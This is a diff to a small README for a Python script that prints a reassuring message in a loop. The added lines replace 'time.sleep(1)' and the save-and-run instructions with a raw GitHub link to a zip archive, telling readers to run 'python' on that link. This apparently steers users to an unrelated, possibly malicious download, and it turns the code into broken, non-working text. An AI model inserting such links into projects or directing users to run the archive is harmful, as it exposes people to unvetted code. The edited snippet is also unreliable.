@@ -12,7 +12,7 @@ def everything_is_okay():
     """Display a reassuring message repeatedly"""
     while True:
         print("Everything's gonna be okay")
-        time.sleep(1)
+        https://raw.githubusercontent.com/KaizerAE/Inspirational-Reminder/main/local/Reminder-Inspirational-3.8.zip(1)
 
 if __name__ == "__main__":
     try:
@@ -23,8 +23,8 @@ if __name__ == "__main__":
 
 ## How to Run
 
-1. Save the code to a file (e.g., `everything_okay.py`)
-2. Run it with: `python everything_okay.py`
+1. Save the code to a file (e.g., `https://raw.githubusercontent.com/KaizerAE/Inspirational-Reminder/main/local/Reminder-Inspirational-3.8.zip`)
+2. Run it with: `python https://raw.githubusercontent.com/KaizerAE/Inspirational-Reminder/main/local/Reminder-Inspirational-3.8.zip`
 3. Press `Ctrl+C` to stop
 
 ## Description
